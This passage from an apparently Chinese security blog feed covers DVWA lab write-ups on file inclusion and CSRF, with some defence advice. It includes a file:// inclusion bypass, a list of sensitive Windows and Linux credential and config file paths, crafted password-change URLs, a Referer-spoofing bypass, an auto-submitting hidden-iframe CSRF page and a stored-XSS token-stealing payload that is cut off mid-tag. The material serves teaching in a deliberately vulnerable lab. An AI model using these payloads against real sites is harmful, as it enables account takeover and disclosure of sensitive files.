class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Input validation</span></span><br><span class="line"><span class="variable">$file</span> = str_replace( <span class="keyword">array</span>( <span class="string">&quot;http://&quot;</span>, <span class="string">&quot;https://&quot;</span> ), <span class="string">&quot;&quot;</span>, <span class="variable">$file</span> );</span><br><span class="line"><span class="variable">$file</span> = str_replace( <span class="keyword">array</span>( <span class="string">&quot;../&quot;</span>, <span class="string">&quot;..\&quot;&quot;</span> ), <span class="string">&quot;&quot;</span>, <span class="variable">$file</span> );</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>从代码也可以看出来对关键字进行了过滤</p><h2 id="high"><a href="#high" class="headerlink" title="high"></a>high</h2><p><strong>源码：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Input validation</span></span><br><span class="line"><span class="keyword">if</span>( !fnmatch( <span class="string">&quot;file*&quot;</span>, <span class="variable">$file</span> ) &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;include.php&quot;</span> ) &#123;</span><br><span class="line"><span class="comment">// This isn&#x27;t the page we want!</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;ERROR: File not found!&quot;</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>源码中限制了文件名来防止恶意文件包含，<code>!fnmatch( &quot;file*&quot;, $file )</code>代码使用了<code>fnmatch</code>函数检查page参数，要求page参数的开头必须是file，服务器才会去包含相应的文件。</p><p>此时平常的绕过就不好使，可使用file协议来触发文件包含</p><p>输入url：<a href="http://127.0.0.1/DVWA/vulnerabilities/fi/?page=file://D:%5Cphpinfo.php">http://127.0.0.1/DVWA/vulnerabilities/fi/?page=file://D:\phpinfo.php</a></p><p>成功回显</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210720203131.png"></p><h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><p><strong>源码：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Only allow include.php or file&#123;1..3&#125;.php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$file</span> != <span class="string">&quot;include.php&quot;</span> &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;file1.php&quot;</span> &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;file2.php&quot;</span> &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;file3.php&quot;</span> ) &#123;</span><br><span class="line"><span class="comment">// This isn&#x27;t the page we want!</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;ERROR: File not found!&quot;</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>由后端代码可知前端输入参数必须是这些固定值，所以无法实现文件包含漏洞</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>三种包含手段：本地包含，远程包含，file协议包含</p><p>绕过方式：file协议，双写绕过</p><p>危害：敏感信息读取，getshell</p><h2 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h2><ol><li>尽量不使用动态包含，无需情况下设置allow_url_include和allow_url_fopen为关闭;</li><li>对可以包含的文件进行限制︰使用白名单的方式，或者设置包含的目录，open_basedir ;</li><li>严格检查用户输入，参数中不允许出现../之类的目录跳转符;</li><li>严格检查变量是否初始化;</li><li>不要仅仅在客户端做数据的验证与过滤，关键的过滤步骤在服务端进行。</li></ol><h2 id="常见敏感路径"><a href="#常见敏感路径" class="headerlink" title="常见敏感路径"></a>常见敏感路径</h2><p>1 Windows<br>C:\boot.ini //查看系统版本<br>C:\windows\system32\inetsrv\MetaBase.xml //IIS 配置文件<br>C:\windows\repair\sam //存储 windows 系统初次安装的密码<br>C:\Program Files\mysql\my.ini //mysql 配置<br>C:\Program Files\mysql\data\mysql\user.MYD //Mysql root<br>C:\windows\php.ini //php 配置信息<br>C:\windows\my.ini //mysql 配置文件</p><p>2 UNIX/Linux<br>/etc/passwd<br>/usr/local/app/apache2/conf/httpd.conf //apache2 默认配置文件<br>/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置<br>/usr/local/app/php5/lib/php.ini //PHP 相关配置<br>/etc/httpd/conf/httpd.conf //apache<br>/etc/php5/apache2/php.ini //ubuntu 系统的默认路径</p><p>日志默认路径<br>(1) apache+Linux 日志默认路径<br>/etc/httpd/logs/access_log<br>或者<br>/var/log/httpd/access_log</p><p>(2) apache+win2003 日志默认路径<br>D:\xampp\apache\logs\access.log<br>D:\xampp\apache\logs\error.log</p><p>(3) IIS6.0+win2003 默认日志文件<br>C:\WINDOWS\system32\Logfiles</p><p>(4) IIS7.0+win2003 默认日志文件<br>%SystemDrive%\inetpub\logs\LogFiles</p><p>(5) nginx 日志文件<br>日志文件在用户安装目录 logs 目录下<br>以我的安装路径为例/usr/local/nginx,<br>那我的日志目录就是在/usr/local/nginx/logs里<br>web 中间件默认配置<br>(1) apache+linux 默认配置文件<br>/etc/httpd/conf/httpd.conf<br>或者<br>index.php?page=/etc/init.d/httpd<br>(2) IIS6.0+win2003 配置文件<br>C:/Windows/system32/inetsrv/metabase.xml<br>(3) IIS7.0+WIN 配置文件<br>C:\Windows\System32\inetsrv\config\applicationHost.config</p><blockquote><p><a href="https://gcdcx.blog.csdn.net/article/details/106007539">https://gcdcx.blog.csdn.net/article/details/106007539</a></p><p><a href="https://blog.csdn.net/weixin_43847838/article/details/111088010">https://blog.csdn.net/weixin_43847838/article/details/111088010</a></p><p><a href="https://blog.csdn.net/qq_39431542/article/details/88628225">https://blog.csdn.net/qq_39431542/article/details/88628225</a></p><p><a href="https://www.wawyw.top/posts/38386.html">https://www.wawyw.top/posts/38386.html</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> WEB安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
            <tag> DVWA </tag>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DVWA之CSRF漏洞复现</title>
      <link href="/2021/07/19/CSRF(%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0)/"/>
      <url>/2021/07/19/CSRF(%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0)/</url>
      
        <content type="html"><![CDATA[<h1 id="CSRF-跨站请求伪造"><a href="#CSRF-跨站请求伪造" class="headerlink" title="CSRF(跨站请求伪造)"></a>CSRF(跨站请求伪造)</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p><strong>跨站请求伪造</strong>（英语：Cross-site request forgery），也被称为 <strong>one-click attack</strong> 或者 <strong>session riding</strong>，通常缩写为 <strong>CSRF</strong> 或者 <strong>XSRF</strong>，攻击者会伪造一个请求（通常是一个链接），然后欺骗目标用户点击，用户一旦点击，攻击也就完成了。</p><h2 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h2><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210719222158.png"></p><p>从上图可以看出，要完成一次CSRF攻击，受害者必须依次完成两个步骤：</p><p>　    1.登录受信任网站A，并在本地生成Cookie。</p><p>　　2.在不登出A的情况下，访问危险网站B。</p><p>　　看到这里，你也许会说：“如果我不满足以上两个条件中的一个，我就不会受到CSRF的攻击”。是的，确实如此，但你不能保证以下情况不会发生：</p><p>　　1.你不能保证你登录了一个网站后，不再打开一个tab页面并访问另外的网站。</p><p>　　2.你不能保证你关闭浏览器了后，你本地的Cookie立刻过期，你上次的会话已经结束。（事实上，关闭浏览器不能结束一个会话，但大多数人都会错误的认为关闭浏览器就等于退出登录/结束会话了……）</p><p>　　3.上图中所谓的攻击网站，可能是一个存在其他漏洞的可信任的经常被人访问的网站。</p><h3 id="例如"><a href="#例如" class="headerlink" title="例如"></a>例如</h3><p>一个银行网站A的转账链接为<a href="http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000">http://www.mybank.com/Transfer.php?toBankId=11&amp;money=1000</a></p><p>攻击者网站B有一段html代码为：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">http://www.mybank.com/Transfer.php?toBankId</span>=<span class="string">57&amp;money</span>=<span class="string">1000</span>&gt;</span></span><br></pre></td></tr></table></figure><p>首先你先登录A这个时候A会给你发送cookie，这个时候你只是想进来转一转并没有想转账，同时你有点开了B，点开那一瞬间你发现你少了1000因为在你点开的那一瞬间你带着你的cookie向银行网站发送了转账请求。</p><p><em><strong>csrf攻击本质是重要操作的所有参数，都可以被攻击者猜测到，如果所有参数都知道那么攻击者就可以自己构造url来达到攻击目的。现在为了让用户自己点击是为了获取其cookie</strong></em></p><h2 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h2><ul><li>以受害者名义发送邮件，发消息</li><li>盗取受害者的账号</li><li>购买商品</li><li>虚拟货币转账</li><li>等等</li></ul><h2 id="DVWA-CSRF"><a href="#DVWA-CSRF" class="headerlink" title="DVWA CSRF"></a>DVWA CSRF</h2><h2 id="low级别"><a href="#low级别" class="headerlink" title="low级别"></a>low级别</h2><p>是一个网站修改密码界面，可知该项目的目的是攻击者伪造恶意修改密码的链接让用户去点击，从而达到获取用户密码的目的。</p><p>那么当下目标就是构造恶意链接，即知道请求的所有参数是什么</p><p>输入password password</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210719222216.png"></p><p>点击change，发现请求url为<a href="http://192.168.43.61/DVWA/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change#">http://192.168.43.61/DVWA/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change#</a></p><p>由此可知修改密码时后端所需要的参数为password_new，password_conf，change以及cookie(从后端代码看是需要cookie验证的)</p><p>这四个参数其中前三个可以由攻击者自己设置没有关系，最后那个cookie只需要用户点击攻击者的恶意链接（伪装为超链接）比如<a href="http://192.168.43.61/DVWA/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#%EF%BC%8C%E6%AD%A4%E6%97%B6%E7%94%A8%E6%88%B7%E5%B0%B1%E5%8F%91%E9%80%81%E8%AF%A5url%E8%AF%B7%E6%B1%82%E5%B9%B6%E6%90%BA%E5%B8%A6%E8%87%AA%E5%B7%B1%E7%9A%84cookie%EF%BC%8C%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%BB%A5%E4%B8%BA%E6%98%AF%E6%9C%AC%E4%BA%BA%E5%B0%B1%E6%89%A7%E8%A1%8C%E4%BA%86%E4%BF%AE%E6%94%B9%E5%AF%86%E7%A0%81%E6%93%8D%E4%BD%9C">http://192.168.43.61/DVWA/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#，此时用户就发送该url请求并携带自己的cookie，服务器以为是本人就执行了修改密码操作</a></p><p>模拟用户点击了攻击者网站的恶意链接，即在浏览器输入<a href="http://192.168.43.61/DVWA/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#%EF%BC%8C%E7%84%B6%E5%90%8E%E5%8F%91%E7%8E%B0%E9%A1%B5%E9%9D%A2%E6%98%BE%E7%A4%BApassword">http://192.168.43.61/DVWA/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#，然后发现页面显示password</a> changed，说明修改成功</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210719222218.png"></p><h3 id="源码："><a href="#源码：" class="headerlink" title="源码："></a>源码：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line"><span class="comment">// Get input</span></span><br><span class="line"><span class="variable">$pass_new</span>  = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line"><span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Do the passwords match?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line"><span class="comment">// They do!</span></span><br><span class="line"><span class="variable">$pass_new</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_new</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"><span class="variable">$pass_new</span> = md5( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Update the database</span></span><br><span class="line"><span class="variable">$insert</span> = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$insert</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Feedback for the user</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// Issue with passwords matching</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="Medium级别"><a href="#Medium级别" class="headerlink" title="Medium级别"></a>Medium级别</h2><p>输入123 123提交后发现请求参数没有变，那么依旧如上</p><p>模拟用户已经点击了攻击者网站的恶意链接，即浏览器中输入<a href="http://192.168.43.61/DVWA/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#%EF%BC%8C%E5%8F%91%E7%8E%B0%E8%BF%94%E5%9B%9E%E6%9D%A5%E9%94%99%E8%AF%AF%EF%BC%9A">http://192.168.43.61/DVWA/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#，发现返回来错误：</a></p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210719222308.png"></p><p>说明后端对于请求头的HTTP_REFERER字段进行了验证，看是不是从本网站的正常上一个页面过来的，针对此我们可以bp抓包修改HTTP_REFERER字段为正常修改密码的上一个页面：</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210719222324.png"></p><p>然后发现密码被修改成功：</p><p><img src="https://cdn.jsdelivr.net/gh/xunyang1/picture_bed/images/20210719222218.png"></p><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line"><span class="comment">// Checks to see where the request came from</span></span><br><span class="line"><span class="keyword">if</span>( stripos( <span class="variable">$_SERVER</span>[ <span class="string">&#x27;HTTP_REFERER&#x27;</span> ] ,<span class="variable">$_SERVER</span>[ <span class="string">&#x27;SERVER_NAME&#x27;</span> ]) !== <span class="literal">false</span> ) &#123;<span class="comment">//检测refer字段</span></span><br><span class="line"><span class="comment">// Get input</span></span><br><span class="line"><span class="variable">$pass_new</span>  = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line"><span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Do the passwords match?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line"><span class="comment">// They do!</span></span><br><span class="line"><span class="variable">$pass_new</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_new</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line"><span class="variable">$pass_new</span> = md5( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Update the database</span></span><br><span class="line"><span class="variable">$insert</span> = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$insert</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Feedback for the user</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// Issue with passwords matching</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// Didn&#x27;t come from a trusted source</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;That request didn&#x27;t look correct.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="high级别"><a href="#high级别" class="headerlink" title="high级别"></a>high级别</h2><p>输入123 123发现url请求参数多了一个token</p><p>token是当用户访问网站时服务器给用户下发的，此时服务器也会保留一份，当用户再次访问网站时会将token取下与数据库中的token进行比对如果一样则说明是其本人，然后在执行业务操作，最后再给用户发一个，用于下一次验证，可见每次的用户token都不一样，当攻击者不知道用户的token时就很难实现csrf因为不能构造出相应的请求链接</p><p>这个是目前防止csrf攻击最常用的一种手段，如果想实施csrf那么我们就需要知道用户的token</p><ul><li><p>一种方法是攻击者制作一个特定页面诱使用户点击，当用户点击该链接的这一刻，该代码会偷偷的访问修改用户密码的页面，然后获取到服务器返回的 token ，然后再构造修改密码的表单，加上我们获取到服务器的token值，向服务器发送修改密码的请求。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">        <span class="comment">//获取用户的token，并设置为表单中的token，然后提交修改密码的表单</span></span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">attack</span>(<span class="params"></span>)</span></span></span><br><span class="line"><span class="function"><span class="javascript">        </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.getElementsByName(<span class="string">&#x27;user_token&#x27;</span>)[<span class="number">0</span>].value=<span class="built_in">document</span>.getElementById(<span class="string">&quot;hack&quot;</span>).contentWindow.document.getElementsByName(<span class="string">&#x27;user_token&#x27;</span>)[<span class="number">0</span>].value;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.getElementById(<span class="string">&quot;transfer&quot;</span>).submit();</span></span><br><span class="line"><span class="javascript">        &#125;</span></span><br><span class="line"><span class="javascript">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span> <span class="attr">onload</span>=<span class="string">&quot;attack()&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;http://192.168.10.14/dvwa/vulnerabilities/csrf/&quot;</span> <span class="attr">id</span>=<span class="string">&quot;hack&quot;</span>  <span class="attr">style</span>=<span class="string">&quot;display:none;&quot;</span>&gt;</span>  <span class="comment">&lt;!--在该网页内打开另一个网页--&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;GET&quot;</span> <span class="attr">id</span>=<span class="string">&quot;transfer&quot;</span>  <span class="attr">action</span>=<span class="string">&quot;http://192.168.10.14/dvwa/vulnerabilities/csrf/&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password_new&quot;</span> <span class="attr">value</span>=<span class="string">&quot;admin&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password_conf&quot;</span> <span class="attr">value</span>=<span class="string">&quot;admin&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;user_token&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;Change&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Change&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>但是由于同源策略该页面的js代码无法不可能跨域取到改密界面中的user_token</p></li><li><p>第二种方法就是利用存储型XSS，若网站存在存储型XSS，那么构造如下payload</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">&quot;../csrf/&quot;</span> <span class="attr">onload</span>=<span class="string">alert(frames[0].document.getElementsByName(</span>&#x27;<span class="attr">user_token</span>&#x27;)[<span class="attr">0</span>]<span class="attr">.value</span>)&gt;</span><span class="tag">&lt;/<span 